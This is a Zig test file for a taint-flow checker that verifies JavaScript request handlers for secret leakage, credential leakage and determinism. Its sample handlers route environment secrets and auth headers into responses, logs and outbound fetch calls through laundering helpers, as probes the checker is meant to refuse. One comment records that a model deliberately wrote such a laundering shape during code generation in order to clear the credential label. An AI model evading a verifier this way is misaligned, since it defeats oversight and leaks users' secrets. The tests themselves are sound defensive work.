        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  const key = "k";
        \\  out[key] = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "a clock-reading export labels its result nondeterministic" {
    // The label is seeded from the export's own capability set, so it tracks
    // the per-export rows: `jwtVerify` declares `.clock` for its exp check and
    // `parseBearer` declares nothing, and only the first can vary between runs.
    const allocator = std.testing.allocator;
    const source =
        \\import { uuid } from "zttp:id";
        \\function handler(req) {
        \\  const id = uuid();
        \\  return Response.json({ id: id });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw = false;
    var it = checker.module_fn_labels.iterator();
    while (it.next()) |e| {
        if (e.value_ptr.nondeterministic) saw = true;
    }
    try std.testing.expect(saw);
}

test "a capability-free export is not labelled nondeterministic" {
    const allocator = std.testing.allocator;
    const source =
        \\import { parseBearer } from "zttp:auth";
        \\function handler(req) {
        \\  const t = parseBearer(req.headers["authorization"] ?? "");
        \\  return Response.json({ present: t !== undefined });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var it = checker.module_fn_labels.iterator();
    while (it.next()) |e| {
        try std.testing.expect(!e.value_ptr.nondeterministic);
    }
}

/// Run the flow checker over `source` and report whether it still proves
/// `deterministic`.
fn runDeterministic(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().deterministic;
}

test "a clock-derived value reaching the response costs determinism" {
    // The case the capability heuristic cannot see. `cacheGet` returns a value
    // the store may answer differently on a later run, and the label follows it
    // through the binding into the response body.
    const source =
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", "v");
        \\  const seen = cacheGet("ns", "k");
        \\  return Response.json({ seen: seen });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read that never reaches the response keeps determinism" {
    // `logInfo` reads the clock for its timestamp and returns nothing that is
    // used, so no label reaches the response sink. This is the false negative
    // the interim capability rule had to special-case; here it falls out of the
    // flow rather than out of a rule about write effects.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", {});
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a handler touching no varying source keeps determinism" {
    const source =
        \\function handler(req) { return Response.json({ ok: true }); }
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a row read out of the database costs determinism" {
    // `zttp:sql` declares `.sqlite` and `.policy_check` and no clock, so the
    // capability rule saw nothing varying and this handler proved
    // `deterministic` while the row it returns is whatever the last write left
    // in the table. A read from mutable module state is the second varying
    // source, and it is the one no capability set can express.
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  const row = sqlOne("getUser");
        \\  return Response.json({ row: row });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "cache counters in the response cost determinism" {
    // `cacheStats` reads no clock: it sums counters the store already holds.
    // Before the rows were tightened it was demoted anyway, because
    // `zttp:cache` declared `.clock` at module level for the expiry checks in
    // `cacheGet`. The verdict was right and the reason was an accident, so
    // making the row truthful had to come with the rule that really covers it.
    const source =
        \\import { cacheStats } from "zttp:cache";
        \\function handler(req) {
        \\  return Response.json({ stats: cacheStats() });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a compiled schema is not a varying source" {
    // `zttp:validate` is stateful too, but its state is a schema registry the
    // handler compiles from literals inside its own run, so `validateJson`
    // answers the same way every time. Demoting it would be a false negative on
    // the most common validation path, which is why the rule keys on a `.read`
    // effect rather than on `stateful` alone.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.ok });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

// A parsing export answers with its own declared labels, so for a long time it
// dropped everything its argument carried. Any label laundered through one:
// `env("JWT_SECRET")` routed through `validateJson` and returned in the body
// proved `no_secret_leakage`. Found by a model, which wrote the shape
// deliberately during a codegen recording and said in its own commentary that
// it did so to clear the credential label. See
// docs/solutions/security-issues/validate-json-strips-the-label-it-was-asked-to-check.md.
//
// The rule now: such an export discharges `user_input` and nothing else.

test "validateJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = validateJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "coerceJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, coerceJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = coerceJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "decodeJson does not launder a secret" {
    // A second module, which is what makes this a rule about the shape of an
    // export rather than a defect in one row of one registry.
    const source =
        \\import { env } from "zttp:env";
        \\import { decodeJson } from "zttp:decode";
        \\function handler(req) {
        \\  const r = decodeJson(env("JWT_SECRET"), "");
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "escapeHtml does not launder a secret" {
    // Escaping defends against injection. It does not make a secret public,
    // which the renderToString arm already said and this family did not.
    const source =
        \\import { env } from "zttp:env";
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: escapeHtml(env("JWT_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "validateJson does not launder a credential" {
    // The shape the model actually wrote: verified claims round-tripped
    // through the validator to clear the `credential` label.
    const source =
        \\import { env } from "zttp:env";
        \\import { parseBearer, jwtVerify } from "zttp:auth";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("claims", "{}");
        \\  const result = jwtVerify(parseBearer(req.headers["authorization"]), env("JWT_SECRET"));
        \\  const claims = validateJson("claims", JSON.stringify(result.value));
        \\  return Response.json({ claims: claims.value });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "a validator still discharges user input" {
    // The discharge is the one label these exports are entitled to clear, and
    // the fix must not take it away: this is the ordinary validation path, and
    // demoting it would make every validated handler unprovable.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.value });
        \\}
    ;
    try std.testing.expect(try runInputValidated(std.testing.allocator, source));
}

// The same conflation, one module further on, and without the discharge that
// made the validator family arguable: a dictionary holds what was put in it,
// and a JSON document is its input in another shape. Both modules declared no
// labels at all, so both answered the empty set and every label the argument
// carried was dropped. Measured before the fix: the first of these proved
// `no_secret_leakage` with the secret in the response body.

test "a dictionary does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", env("API_SECRET"));
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "stringifyJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { stringifyJson } from "zttp:json";
        \\function handler(req) {
        \\  const r = stringifyJson(env("API_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "base64Encode does not launder a secret" {
    // The sharpest row of the family: the output is the input, in another
    // alphabet. Nothing about it is even arguably a declassification.
    const source =
        \\import { env } from "zttp:env";
        \\import { base64Encode } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: base64Encode(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sha256 does not launder a secret" {
    // The arguable row, and marked for the reason it is arguable. A hash is
    // one-way, so "it is safe now" is available to say - and neither this
    // registry nor the analysis can check it, while an unsalted hash of a
    // low-entropy secret is recoverable. A declassification is spelled by an
    // export that declares what it clears, the way `mask` does below.
    const source =
        \\import { env } from "zttp:env";
        \\import { sha256 } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: sha256(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a text transform does not launder a secret" {
    // A second module, and one nobody would think of as a security boundary,
    // which is the point: the shape is what decides, not the module's subject.
    const source =
        \\import { env } from "zttp:env";
        \\import { slugify } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: slugify(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask still declassifies, because that is what it is for" {
    // The deliberate declassifier, pinned so the sweep that marked its
    // neighbours cannot quietly take it with them. `mask` exists to make a
    // secret printable; an export that unioned its input back in would have no
    // reason to exist.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: mask(env("API_SECRET"), 4) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "the direct return of a secret is refused" {
    // The control for the two probes below. Without it a `false` from either
    // one could mean the harness refuses everything, which would make the
    // probe pass while checking nothing.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  return Response.json({ v: env("API_SECRET") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "scope.using does not launder the resource it hands back" {
    // `using` returns argument 0 unchanged at runtime. It declared
    // `returns_from_param = .identity` and no `derives_from_args`, and
    // `scanImports` populates `module_fn_arg_derived` from that field alone, so
    // the identity return was never wired to label propagation: the call was
    // credited with closure labels only and the secret arrived unlabelled.
    const source =
        \\import { env } from "zttp:env";
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  return Response.json({ v: using(env("API_SECRET"), (r) => r) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "scope.using does not launder a credential either" {
    const source =
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  const token = req.headers.get("authorization");
        \\  return Response.json({ v: using(token, (r) => r) });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "scope.using still proves clean for an ordinary resource" {
    // The pass-through has to keep working for the handlers it exists for.
    // A propagating export is only useful if it does not refuse those.
    const source =
        \\import { using } from "zttp:scope";
        \\function handler(req) {
        \\  return Response.json({ v: using("plain", (r) => r) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and read back is not proven clean" {
    // The read call holds no reference to what the write put there, so the
    // checker cannot follow the provenance - and the export answered with a
    // benign `.internal` label rather than with ignorance. That reported
    // `no_secret_leakage` PROVEN for a secret round-tripped through the store.
    //
    // `derives_from_args` is the WRONG fix here and is a no-op:
    // `argDerivedLabels` unions only the current call's own arguments, which
    // for `cacheGet("ns", "k")` are two string literals - never the secret a
    // separate `cacheSet` wrote. The primitive that fits is `.unknown`.
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheGet("ns", "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a queue read is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { send, receive } from "zttp:queue";
        \\function handler(req) {
        \\  send("q", env("API_SECRET"));
        \\  return Response.json({ v: receive("q") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row read is not proven clean" {
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ row: sqlOne("getUser") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row set read is not proven clean" {
    const source =
        \\import { sqlMany } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ rows: sqlMany("listUsers") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a durable signal payload is not proven clean" {
    // `waitSignalNative` returns `callbacks.wait_signal_fn(...)` directly -
    // literally the `payload` argument of a separate `signal(key, name,
    // payload)` call - and relabelled it `.external`.
    const source =
        \\import { waitSignal } from "zttp:durable";
        \\function handler(req) {
        \\  return Response.json({ v: waitSignal("approved") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a rate-limit counter is still proven clean" {
    // The control that keeps the sweep honest. `rateCheck` declares
    // `.internal` in the same shape as the five store reads, and is correctly
    // excluded: it returns a counter derived from the limiter's own state, and
    // no caller ever writes a value into it. Marking it `.unknown` would cost
    // every rate-limited handler three properties for no provenance gap.
    const source =
        \\import { rateCheck } from "zttp:ratelimit";
        \\function handler(req) {
        \\  return Response.json({ allowed: rateCheck("ip", 10, 60) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "ordinary text through the same exports still proves clean" {
    // The control for the whole sweep. Propagating every argument label is only
    // useful if it does not refuse the handlers these modules exist for.
    const source =
        \\import { sha256 } from "zttp:crypto";
        \\import { slugify } from "zttp:text";
        \\import { urlEncode } from "zttp:url";
        \\function handler(req) {
        \\  const title = "hello world";
        \\  return Response.json({ a: sha256(title), b: slugify(title), c: urlEncode(title) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a dictionary of ordinary data still proves clean" {
    // The control. Propagating every argument label is only useful if it does
    // not refuse the handlers the module exists for: nothing labelled goes in
    // here, so nothing labelled comes out.
    const source =
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", "v");
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a clock read reaching the response costs determinism" {
    // `Date.now()` is a global member call, so it carries no import to seed a
    // label from. The label is attached to the read itself and follows the
    // binding into the response body.
    const source =
        \\function handler(req) {
        \\  const at = Date.now();
        \\  return Response.json({ at: at });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a random draw reaching the response costs determinism" {
    const source =
        \\function handler(req) { return Response.json({ roll: Math.random() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read reaching only a log keeps determinism" {
    // The direction the capability rule cannot express: the timestamp reaches
    // stderr and stops, so the two runs answer the same body.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", { at: Date.now() });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a clock read behind a helper reaches the response" {
    // The call summary collects the helper's return labels, so the read does
    // not launder through a wrapper the way it would if only the handler body
    // were walked.
    const source =
        \\function stamp() { return Date.now(); }
        \\function handler(req) { return Response.json({ at: stamp() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a shadowed Date does not carry the varying label" {
    // `Date` here is a local object, not the global, so its `now()` is whatever
    // the handler defined. Labelling it would demote a handler that is in fact
    // deterministic.
    const source =
        \\function handler(req) {
        \\  const Date = { now: () => 7 };
        \\  return Response.json({ at: Date.now() });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "no flow diagnostic offers a repair a guard cannot perform" {
    // Every kind in this checker reports that a labelled value reached a sink.
    // The label is what fails the proof, and `insert_guard_before_line` inserts
    // a conditional - it cannot remove a label, and `.validated` is conferred
    // only by a validator call (validateJson, validateObject, schemaCompile,
    // renderToString), never by an `if`. So every repair intent this checker
    // offered was one that could not clear the diagnostic offering it.
    //
    // That was survivable while the intent never reached the model. Once
    // diagnostics started carrying `repair_intent` to the agent, a recorded
    // case spent its whole attempt budget on it: "Hmm, what does
    // insert_guard_before_line mean for secret taint? Possibly wrapping the
    // response in a branch that verifies the secret? No..." and "A guard before
    // line 24: e.g., check `values.appName === undefined`? That doesn't remove
    // taint." A wrong repair is worse than none, because none is silent.
    //
    // Read off diagnostics the checker emitted, not off a struct this test
    // built. An earlier version constructed its own `Diagnostic` literal per
    // enum member and asserted `repair_intent == null` on it: that field's
    // declared default is null, so the loop asserted the struct default and
    // would have passed with every emission site in this file setting an
    // intent. `kindsTrippedByProbeCorpus` runs the checker instead, and its
    // coverage floor below fails when a kind stops being reachable - a corpus
    // that trips nothing must not read as a pass.
    var seen = std.EnumSet(DiagnosticKind).initEmpty();
    for (repair_intent_probe_corpus) |source| {
        try collectFlowDiagnosticKinds(std.testing.allocator, source, &seen);
    }
    inline for (@typeInfo(DiagnosticKind).@"enum".fields) |field| {
        const kind = @field(DiagnosticKind, field.name);
        if (!seen.contains(kind)) {
            std.debug.print("no probe source trips flow kind '{s}'\n", .{field.name});
            return error.FlowProbeCorpusMissesKind;
        }
    }
}

/// One handler per `DiagnosticKind`, so the probe above reads a real emission
/// for every member of the enum rather than a default it wrote itself.
const repair_intent_probe_corpus = [_][]const u8{
    // secret_in_response
    \\import { env } from "zttp:env";
    \\function handler(req) { return Response.json({ v: env("SECRET_KEY") }); }
    ,
    // credential_in_response
    \\function handler(req) { return Response.json({ v: req.headers.authorization }); }
    ,
    // secret_in_log
    \\import { env } from "zttp:env";
    \\function handler(req) {
    \\  console.log(env("SECRET_KEY"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_log
    \\function handler(req) {
    \\  console.log(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_url
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(env("SECRET_URL"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_egress_url
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_body
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: env("SECRET_KEY") });
    \\  return Response.json({ ok: true });
    \\}
    ,
    // unvalidated_input_in_egress
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: req.body });
    \\  return Response.json({ ok: true });
    \\}
    ,
};

/// Run the FlowChecker over `source`, record which kinds it emitted, and refuse
/// any diagnostic that carries a repair intent.
fn collectFlowDiagnosticKinds(
    allocator: std.mem.Allocator,
    source: []const u8,
    seen: *std.EnumSet(DiagnosticKind),
) !void {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |diagnostic| {
        seen.insert(diagnostic.kind);
        if (diagnostic.repair_intent != null) {
            std.debug.print(
                "flow kind '{s}' carries a repair intent\n",
                .{@tagName(diagnostic.kind)},
            );
            return error.FlowDiagnosticOffersUnperformableRepair;
        }
    }
}
